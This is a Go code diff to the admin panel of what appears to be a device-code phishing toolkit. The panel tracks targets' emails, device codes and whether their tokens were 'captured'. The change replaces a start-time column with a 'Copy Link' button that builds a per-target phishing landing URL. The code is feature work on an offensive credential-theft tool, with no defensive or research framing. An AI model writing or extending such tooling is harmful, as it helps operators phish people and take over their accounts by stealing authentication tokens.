@@ -1652,7 +1652,7 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			b.WriteString(`<div class="empty">No targets yet. Start a campaign or manual device code flow.</div>`)
 		} else {
 			b.WriteString(`<div class="table-wrap"><table><thead><tr>
-<th>ID</th><th>Email</th><th>Code</th><th>Status</th><th>Started</th><th>Tokens</th>
+<th>ID</th><th>Email</th><th>Code</th><th>Status</th><th>Landing Link</th><th>Tokens</th>
 </tr></thead><tbody>`)
 			for _, t := range dcTargets {
 				statusBadge := `<span class="badge badge-gray">` + template.HTMLEscapeString(t.GetStatus()) + `</span>`
@@ -1673,19 +1673,24 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 					tokensCell = `<span style="color:var(--accent-success)">✓ captured</span>`
 				}
 
+				// Build landing URL
+				landingHost := s.Cfg.GetDCLandingHost()
+				landingURL := fmt.Sprintf("https://%s/dc/%s", landingHost, t.LandingToken)
+				landingCell := fmt.Sprintf(`<button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy Link</button>`, template.HTMLEscapeString(landingURL))
+
 				b.WriteString(fmt.Sprintf(`<tr>
 <td class="mono" style="color:var(--text-muted)">%d</td>
 <td class="mono" style="font-size:12px">%s</td>
 <td class="mono" style="font-weight:600;letter-spacing:2px">%s</td>
 <td>%s</td>
-<td class="mono" style="font-size:11.5px">%s</td>
+<td>%s</td>
 <td>%s</td>
 </tr>`,
 					t.ID,
 					template.HTMLEscapeString(t.Email),
 					template.HTMLEscapeString(t.UserCode),
 					statusBadge,
-					t.StartedAt.Format("2006-01-02 15:04"),
+					landingCell,
 					tokensCell,
 				))
 			}
